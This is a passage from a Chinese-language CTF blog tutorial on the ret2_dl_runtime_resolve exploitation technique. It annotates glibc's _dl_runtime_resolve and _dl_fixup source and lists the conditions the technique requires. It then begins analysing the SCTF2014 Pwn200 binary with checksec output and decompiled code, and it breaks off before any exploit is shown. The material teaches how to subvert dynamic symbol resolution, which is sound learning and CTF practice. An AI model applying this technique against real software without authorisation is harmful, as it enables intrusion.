class="number">4</span>)</span><br><span class="line">    pushl %edx</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    movl <span class="number">16</span>(%esp), %edx  # Copy args pushed by PLT <span class="keyword">in</span> register.  Note</span><br><span class="line">    movl <span class="number">12</span>(%esp), %eax  # that <span class="string">'fixup'</span> takes its parameters <span class="keyword">in</span> regs.</span><br><span class="line">    <span class="keyword">call</span> _dl_fixup       # <span class="keyword">Call</span> resolver.</span><br><span class="line">    popl %edx            # Get register content back.</span><br><span class="line">    cfi_adjust_cfa_offset (-<span class="number">4</span>)</span><br><span class="line">    movl (%esp), %ecx</span><br><span class="line">    movl %eax, (%esp)    # Store the function address.</span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">    <span class="keyword">ret</span> <span class="number">$12</span>              # Jump to function address.</span><br><span class="line">    cfi_endproc</span><br><span class="line"><span class="meta">.size</span> _dl_runtime_resolve, .-_dl_runtime_resolve</span><br></pre></td></tr></table></figure></p><p><code>修正后</code>的代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line"><span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     <span class="keyword">push</span>   <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     <span class="keyword">push</span>   <span class="built_in">edx</span></span><br><span class="line"><span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0x10</span>]</span><br><span class="line"><span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0xc</span>]</span><br><span class="line">► <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;  <span class="keyword">call</span>   _dl_fixup &lt;<span class="number">0xf7fe77e0</span>&gt;</span><br><span class="line">     arg[<span class="number">0</span>]: <span class="number">0xc</span></span><br><span class="line">     arg[<span class="number">1</span>]: <span class="number">0x8048670</span> ◂— <span class="keyword">imul</span>   <span class="built_in">ebp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span> + <span class="number">0x70</span>], <span class="number">0x6e207475</span> /* <span class="string">'input name:'</span> */</span><br><span class="line"></span><br><span class="line"><span class="number">0xf7fee010</span> &lt;_dl_runtime_resolve+<span class="number">16</span>&gt;    <span class="keyword">pop</span>    <span class="built_in">edx</span></span><br><span class="line"><span class="number">0xf7fee011</span> &lt;_dl_runtime_resolve+<span class="number">17</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>]</span><br><span class="line"><span class="number">0xf7fee014</span> &lt;_dl_runtime_resolve+<span class="number">20</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0xf7fee017</span> &lt;_dl_runtime_resolve+<span class="number">23</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">4</span>]</span><br><span class="line"><span class="number">0xf7fee01b</span> &lt;_dl_runtime_resolve+<span class="number">27</span>&gt;    <span class="keyword">ret</span>    <span class="number">0xc</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;其采用了<code>GNU风格</code>的语法，<code>可读性</code>比较差。我们可以看到函数<code>_dl_runtime_resolve()</code>调用了<strong><code>_dl_fixup(link_map，reloc_arg)</code></strong>，后续操作都是在这个函数中完成的。</p><h4 id="3-2-2、-dl-fixup-的内容"><a href="#3-2-2、-dl-fixup-的内容" class="headerlink" title="3.2.2、_dl_fixup()的内容"></a>3.2.2、_dl_fixup()的内容</h4><p><code>_dl_fixup()</code>的实现位于<strong><code>glibc/elf/dl-runtime.c</code></strong>，其内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* elf_machine_type_class()返回的重定位类型类。 </span></span><br><span class="line"><span class="comment">   ELF_RTYPE_CLASS_PLT表示此重定位不应由某些PLT符号满足，</span></span><br><span class="line"><span class="comment">   ELF_RTYPE_CLASS_COPY意味着此重定位不应由可执行文件中的任何符号满足。 </span></span><br><span class="line"><span class="comment">   某些体系结构不支持copy重定位(引用外部变量)。 在这种情况下，我们将宏定义为零，以便自</span></span><br><span class="line"><span class="comment">   动优化处理它们的代码。 ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA表示</span></span><br><span class="line"><span class="comment">   共享库中定义的受保护数据的地址可能是外部的，即由于copy重定位。 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_RTYPE_CLASS_PLT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DL_NO_COPY_RELOCS</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> ELF_RTYPE_CLASS_COPY 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> ELF_RTYPE_CLASS_COPY 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第一次调用每个PLT条目时，将通过PLT的特殊跳转调用此功能。 我们必须执行给定共享对象的PLT中指定的重定位，并将已解析的函数地址返回到跳转，这将重新启动对该地址的原始调用。 将来的调用将直接从PLT跳转到该功能。 */</span></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           <span class="comment">//l为共享库或可执行文件ID，link_map结构指针。link_map结构链表第一个结点表示的是可执行文件。</span></span><br><span class="line">           <span class="comment">//reloc_arg为所解析函数的重定位项在重定位表.rel.plt中的偏移</span></span><br><span class="line">           struct link_map *l, ElfW(Word) reloc_arg)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//D_PTR是一个宏定义，位于glibc/sysdeps/generic/ldsodefs.h中，用于通过link_map结构体寻址。</span></span><br><span class="line">    <span class="comment">//通过link_map结构获取动态链接符号表.dynsym的地址</span></span><br><span class="line">    <span class="comment">//ELFW宏用来拼接字符串，在这里实际上是为了自动兼容32和64位,Elf32_Sym或Elf64_Sym</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//通过link_map结构获取动态链接字符串表.dynstr的地址</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]); </span><br><span class="line">    <span class="comment">//通过link_map结构获取重定位表.rel.plt中所求函数的重定位项的地址</span></span><br><span class="line">    <span class="comment">//reloc_offset为所解析函数的重定位项在重定位表.rel.plt中的偏移</span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); </span><br><span class="line">    <span class="comment">//求出所求函数在动态链接符号表.dynsym中对应符号项的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">    <span class="comment">//l_addr是共享库或可执行文件加载基址，rel_addr是重定位需要修改内容的地址，也就是.got.plt中所求函数对应项</span></span><br><span class="line">    <span class="comment">//r_offset为相对虚拟地址，rel_addr为虚拟地址</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">lookup_t</span> result;    <span class="comment">//查找函数的结果，其为定义函数的共享对象的加载基地址</span></span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  <span class="comment">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 安全性检查，我们需要确定它是一个PLT的重定位项 */</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">/* 查找目标符号。如果未使用常规查找规则，则不要在全局范围内查找。 */</span></span><br><span class="line">    <span class="comment">//st_other定义了符号的可见性，__builtin_expect返回值为第一个参数</span></span><br><span class="line">    <span class="comment">//#define ELF32_ST_VISIBILITY(o) ((o) &amp; 0x03)</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) <span class="comment">//使用了常规查找规则</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>   <span class="comment">//当前符号的版本</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)   </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//获取动态符号版本表“.gnu.version”的地址</span></span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  <span class="comment">//得到当前所解析符号的版本</span></span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 我们需要保持范围不变，因此需要进行一些锁定。 对于无法卸载的对象或尚未使用任何线程的对象，这不是必需的。  */</span></span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">        &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">            RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">//strtab + sym-&gt;st_name为所解析函数的符号在字符串表中的地址，result为定义函数的共享对象的加载基地址</span></span><br><span class="line">        <span class="comment">//_dl_lookup_symbol_x的功能是在加载的共享对象的符号表中搜索符号的定义，其参数也许带有该符号的版本。</span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">/* 我们已经完成了全局范围的工作。 */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">            RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 当前result包含定义sym的共享对象的加载基地址（或link map）。 现在添加符号偏移量。 */</span></span><br><span class="line">        <span class="comment">//value为所求函数的真实内存地址</span></span><br><span class="line">        <span class="comment">//SYMBOL_ADDRESS(map, ref, map_set)：如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。 </span></span><br><span class="line">        <span class="comment">//如果MAP_SET为TRUE，请勿检查NULL映射。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//未使用常规查找规则</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 我们已经找到了符号。 模块（及其加载地址）也是已知的。 */</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//elf_machine_plt_value返回PLT重定位的最终值。在x86-64上JUMP_SLOT重定位忽略addend。</span></span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line">    <span class="comment">/* 最后，修复PLT本身。 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">//向所查找函数对应的GOT表中填写找到的函数的真实地址。</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>_dl_fixup(l，reloc_arg)</code>有两个参数，<strong><code>l</code></strong>是link_map结构的指针，<strong><code>reloc_arg</code></strong>是所解析函数的<code>重定位项</code>在<code>重定位表.rel.plt</code>中的<code>偏移</code>或<code>下标</code>。<strong><code>32位</code></strong>的<code>reloc_arg</code>和<strong><code>64位</code></strong>的有区别：32位使用<code>reloc_offset</code>, 64位使用<code>reloc_index</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上面几句的作用是从<strong><code>link_map</code></strong>结构中获取<code>动态链接符号表“.dynsym”</code>、<code>动态链接字符串表“.dynstr”</code>的<code>首地址</code>，<code>重定位表“.rel.plt”</code>中所求函数的<code>重定位项</code>的地址，所求函数在<code>动态链接符号表“.dynsym”</code>中<code>对应项的地址</code>，以及重定位<code>需要修改内容</code>的地址<code>rel_addr</code>。<br>&emsp;&emsp;接下来主要是调用了<strong><code>_dl_lookup_symbol_x()</code></strong>函数，<code>_dl_lookup_symbol_x()</code>的功能是在<code>加载的共享对象的符号表</code>中<code>搜索符号的定义</code>，其<code>参数</code>也许带有<code>该符号的版本</code>。它的<code>返回值</code>为定义所求函数的<code>共享对象的加载基址</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strtab + sym-&gt;st_name为所解析函数的符号在字符串表中的地址，result为定义函数的共享对象的加载基地址</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x的功能是在加载的共享对象的符号表中搜索符号的定义，其参数也许带有该符号的版本。</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, </span><br><span class="line">    l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>_dl_lookup_symbol_x()</code></strong>函数的内容比较多，这里就不详细介绍了，准备再写一篇文章，详细介绍Linux下库函数的动态链接过程。其有<strong><code>8个参数</code></strong>：</p><blockquote><ul><li><strong><code>参数1</code></strong>：<code>strtab + sym-&gt;st_name</code>，是指向所要重定位的符号的字符串的指针。</li><li><strong><code>参数2</code></strong>：<code>l</code>，_dl_fixup()函数传进来的link_map结构体链表指针，目前指向第一个结点，即可执行文件对应的链表结点。</li><li><strong><code>参数3</code></strong>：<code>&amp;sym</code>，sym是一个Elf32_Sym类型的结构体对象指针，其指向的是所求函数在动态链接符号表.dynsym中对应符号项。而&amp;sym是这个结构体对象指针的地址。</li><li><strong><code>参数4</code></strong>：<code>l-&gt;l_scope</code>，此link map的查找范围(maps的范围)的指针数组。</li><li><strong><code>参数5</code></strong>：<code>version</code>，所搜索函数的符号版本结构体对象指针。</li><li><strong><code>参数6</code></strong>：<code>ELF_RTYPE_CLASS_PLT</code>，重定位elf_machine_type_class()返回的类型类。</li><li><strong><code>参数7</code></strong>：<code>flags</code>，标志变量。暂时没搞清楚功能。</li><li><strong><code>参数8</code></strong>：<code>*skip_map</code>，需要跳过的、不用搜索的link_map结构体指针。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>_dl_lookup_symbol_x()</code></strong>函数的<code>返回值result</code>为定义函数的<code>共享对象的加载基址</code>。之后我们可以看到使用了<code>DL_FIXUP_MAKE_VALUE()</code>这个宏定义：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 当前result包含定义sym的共享对象的加载基地址（或link map）。 现在添加符号偏移量。 */</span></span><br><span class="line"><span class="comment">//value为所求函数的真实内存地址</span></span><br><span class="line"><span class="comment">//SYMBOL_ADDRESS(map, ref, map_set)：如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。 </span></span><br><span class="line"><span class="comment">//如果MAP_SET为TRUE，请勿检查NULL映射。</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (result,SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 根据地址和link_map构造修正值 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (map) ? ((struct fdesc)&#123;(addr),(map)-&gt;l_info[DT_PLTGOT]-&gt;d_un.d_ptr &#125;) : ((struct fdesc) &#123; 0, 0 &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。如果MAP_SET为TRUE，请勿检查NULL映射。  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOL_ADDRESS(map, ref, map_set) ((ref) == NULL ? 0 : (__glibc_unlikely((ref)-&gt;st_shndx == SHN_ABS) ? 0 : LOOKUP_VALUE_ADDRESS(map, map_set)) + (ref)-&gt;st_value)</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;通过此宏定义，我们可以得到<code>所求符号的真实内存地址</code>，即<strong><code>value</code></strong>。通过一层层宏定义，我们可以知道，<code>符号的真实地址</code>是存在符号项中的<code>st_value</code>中的。之后，通过调用<code>elf_machine_fixup_plt()</code>函数<code>修复GOT表</code>，将<code>重定位函数的真实地址</code>写入可执行文件中<code>函数对应的GOT表项</code>中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向所查找函数对应的GOT表中填写找到的函数的真实地址。</span></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">ElfW</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"><span class="title">elf_machine_fixup_plt</span> <span class="params">(struct link_map *<span class="built_in">map</span>, <span class="keyword">lookup_t</span> t,</span></span></span><br><span class="line">                       const ElfW(Sym) *refsym, const ElfW(Sym) *sym,</span><br><span class="line">                       const ElfW(Rela) *reloc,</span><br><span class="line">                       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="4、真题解析"><a href="#4、真题解析" class="headerlink" title="4、真题解析"></a>4、真题解析</h2><h3 id="4-0、ret2-dl-runtime-resolve适用情况"><a href="#4-0、ret2-dl-runtime-resolve适用情况" class="headerlink" title="4.0、ret2_dl_runtime_resolve适用情况"></a>4.0、ret2_dl_runtime_resolve适用情况</h3><blockquote><ul><li><strong><code>条件1</code></strong>：题目<code>未给出libc库</code>。</li><li><strong><code>条件2</code></strong>：程序<code>未开启PIE保护</code>。如果<code>开启了PIE保护</code>，则还需要通过泄露获取基地址。</li><li><strong><code>条件3</code></strong>：程序<code>未开启FULL RELRO</code>。</li></ul></blockquote><h3 id="4-1、ret2-dl-runtime-resolve利用方式"><a href="#4-1、ret2-dl-runtime-resolve利用方式" class="headerlink" title="4.1、ret2_dl_runtime_resolve利用方式"></a>4.1、ret2_dl_runtime_resolve利用方式</h3><h3 id="4-2、x86的情况——SCTF2014-Pwn200"><a href="#4-2、x86的情况——SCTF2014-Pwn200" class="headerlink" title="4.2、x86的情况——SCTF2014  Pwn200"></a>4.2、x86的情况——SCTF2014  Pwn200</h3><h4 id="1、检查程序开启的保护机制"><a href="#1、检查程序开启的保护机制" class="headerlink" title="1、检查程序开启的保护机制"></a>1、检查程序开启的保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn200</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/pwn200&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看到此程序只开启了<code>NX(堆栈不可执行)</code>。</p><h4 id="2、静态分析"><a href="#2、静态分析" class="headerlink" title="2、静态分析"></a>2、静态分析</h4><p>IDA反编译后<code>主函数</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> main1()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> slogan; <span class="comment">// [esp+1Ch] [ebp-9Ch] 0x80 = 128</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>]; <span class="comment">// [esp+9Ch] [ebp-1Ch]</span></span><br><span class="line">    <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+ACh] [ebp-Ch] 32程序size_t大小为4bytes</span></span><br><span class="line">    </span><br><span class="line">    nbytes = <span class="number">16</span>;</span><br><span class="line">    *name = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    <span 